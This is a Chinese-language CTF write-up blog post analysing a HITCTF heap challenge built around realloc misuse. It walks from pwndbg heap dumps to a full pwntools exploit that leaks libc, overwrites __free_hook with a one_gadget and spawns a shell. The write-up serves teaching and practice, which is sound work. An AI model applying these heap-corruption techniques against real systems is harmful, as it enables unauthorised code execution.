---
layout:     post   			        # 使用的布局（不需要改）
title:      realloc   			# 标题 
subtitle:   in heap	#副标题
date:       2019-11-15 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

最近佛系找题做,突然找到了一道去年 hitctf 的题,看网上也没有 writeup ,于是决定好好分析一波.太菜了,前后花了 5 个小时吧,服了,这题学了很多,分享出来

## 写在前面的程序

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main()
{
	char* a = malloc(0x80);
	char* b = malloc(0x10);
	char* c = malloc(0x20);
	char* d = malloc(0x20);
	char* e = malloc(1);
	a = realloc(a,0x20);
	b = realloc(b,0x20);	//------->断点A
	c = realloc(c,0x20);	//------->断点B
	d = realloc(c,0);
}
```

本程序意思便是 realloc 会重新排步堆空间,这里只介绍一下 a 和 b 块,剩下的可以自行调试.断到断点 A 处查看变化

```
pwndbg> x/10gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000031
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000061
0x602040:	0x0000000000000000	0x0000000000000000
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x602030 ◂— 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> p a
$5 = 0x602010 ""
pwndbg> p b
$2 = 0x6020a0 ""
```

可以看到`realloc(a,0x20)`只用到了 0x31 字节,之前 malloc 剩下的直接扔到了 fastbin 里,被 free 掉.这里注意一下 b 指向 0x6020a0 .单步运行断在 B 处查看变化

```
pwndbg> p b
$3 = 0x602140 ""
pwndbg> x/8gx 0x602140-0x10
0x602130:	0x0000000000000000	0x0000000000000031
0x602140:	0x0000000000000000	0x0000000000000000
0x602150:	0x0000000000000000	0x0000000000000000
0x602160:	0x0000000000000000	0x0000000000020ea1
pwndbg> bins
fastbins
0x20: 0x602090 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x602030 ◂— 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty

```

这里 realloc 一个比之前大的会使之前的 b 直接被 free 掉,重新一个 malloc 一个合适的返给 b .

前言结束

## 分析思路

这题其实挺反常规的,程序的 bss 端 ptr 指向存放内容头,之后的内容头中有指向内容的指针,大致长这样

```
bss->
	**	0x31
  title	name
  time()	chunk_ptr
  size	**
  chk_ptr	->	content
```

在 edit 中有一个不太明显的堆溢出漏洞

```
  if ( *((_DWORD *)ptr[v2] + 8) != v3 )
  {
    v1 = ptr[v2];
    v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);	//realloc()函数,漏洞利用关键点
  }
  puts("new message:");
  return read(0, *((void **)ptr[v2] + 3), *((signed int *)ptr[v2] + 8));	//漏洞点, message size 未更新
}
```

## 泄漏 libc

```
from pwn import *
p = process('./pwn2',aslr=2)
elf = ELF("./pwn2", checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
#context.log_level = "debug"
def new(title,name,size,message):
	p.sendafter('Input your choice:','1')
	p.sendafter('title:\n',title)
	p.sendafter('name:\n',name)
	p.sendafter('message size:\n',str(size))
	p.sendafter('message:\n',message)
def edit(ind,size,message):
	p.sendafter('Input your choice:','2')
	p.sendafter('Which one?\n',str(ind))
	p.sendafter('message size:\n',str(size))
	p.sendafter('new message:\n',message)
def show(ind):
	p.sendafter('Input your choice:','3')
	p.sendafter('Which one?\n',str(ind))
def free(ind):
	p.sendafter('Input your choice:','4')
	p.sendafter('Which one?\n',str(ind))
```

这是框架函数,之后一个

```
new('a','a',0x80,'a'*0x80)
````

让他 malloc 出来一块不属于 fastbin 的堆,再

```
new('b','b',1,'b')
```

防止`topchunk`吞并上一个,然后编辑`edit(0,0x90,'1'*8)`让新的 size 和旧的不等触发

```
v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);
```

这样我们之前的第一个块就到了`unsortedbin`中,然后在`new('d','d',0x80,'d'*8)`一块,这样子内容头就用的是 unsortedbin ,填入 title 和 name 时候占用的就是之前 unsortedbin 残留的 fd 和 bk 了,填充一个字节之后 `show(2)` 让它泄漏出来减去偏移字节,这样就得到了 libc

## getshell

有了 libc 后基本思路就确定了,修改内容头使其指向`__free_hook`,并直接 edit 为 one_gadget ,之后 free 触发 getshell ,所以关键便是如何溢出覆盖内容头

首先

```
new('a','a',0xf7,'a'*0x20)
edit(3,0xb8,'0')
```

构造一个堆,并编辑,使得该块底下有一块可控范围,并控制在 0x30 的 fastbin 中,便于能溢出到内容头,之后

```
new('d','d',1,'d')
```

这个块就中招了,我们能够溢出它,之后填入我们精心构造的堆

```
edit(3,0xb8,'\x01'*0xc8+p64(0x31)*4+p64(libc.symbols['__free_hook'] + leak)+p64(0x51))
```

其中的排步效果如下

```
0x1474310:	0x0101010101010101	0x0000000000000031
0x1474320:	0x0000000000000031	0x0000000000000031
0x1474330:	0x0000000000000031	0x00007f15621627a8
0x1474340:	0x0000000000000051	0x0000000000020cc1
```

之后就是编辑为 one_gadget 和触发了,这里要注意一定要和自己填入的 size 一样,不然又触发`v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);`,或大或小都不会成功,大的话重新 malloc ,小的话有逃不过检查

```
edit(4,0x51,p64(one))
free(0)
```

```
[+] Starting local process './pwn2': pid 6300
0x7f507bfa2000
[*] Switching to interactive mode
$  
```

成功

## 完整exp

```
from pwn import *
p = process('./pwn2',aslr=2)
elf = ELF("./pwn2", checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
#context.log_level = "debug"
def new(title,name,size,message):
	p.sendafter('Input your choice:','1')
	p.sendafter('title:\n',title)
	p.sendafter('name:\n',name)
	p.sendafter('message size:\n',str(size))
	p.sendafter('message:\n',message)
def edit(ind,size,message):
	p.sendafter('Input your choice:','2')
	p.sendafter('Which one?\n',str(ind))
	p.sendafter('message size:\n',str(size))
	p.sendafter('new message:\n',message)
def show(ind):
	p.sendafter('Input your choice:','3')
	p.sendafter('Which one?\n',str(ind))
def free(ind):
	p.sendafter('Input your choice:','4')
	p.sendafter('Which one?\n',str(ind))


new('a','a',0x80,'a'*0x80)
new('b','b',1,'b')
edit(0,0x90,'1'*8)
new('d','d',0x80,'d'*8)
show(2)
p.recvuntil('Title: ')
leak = u64(p.recvuntil('\n')[:-1].ljust(8,"\x00"))-0x3c4b64
print hex(leak)
new('a','a',0xf7,'a'*0x20)
edit(3,0xb8,'0')
new('d','d',1,'d')
edit(3,0xb8,'\x01'*0xc8+p64(0x31)*4+p64(libc.symbols['__free_hook'] + leak)+p64(0x51))
one=leak+0x4526a
edit(4,0x51,p64(one))
free(0)
p.interactive()
```

最后构造出来的块太恶心了,但还好成功了,本题难点就是内容头数据结构和 realloc 的理解了,剩下没什么难点,算是一个比较考构造的题
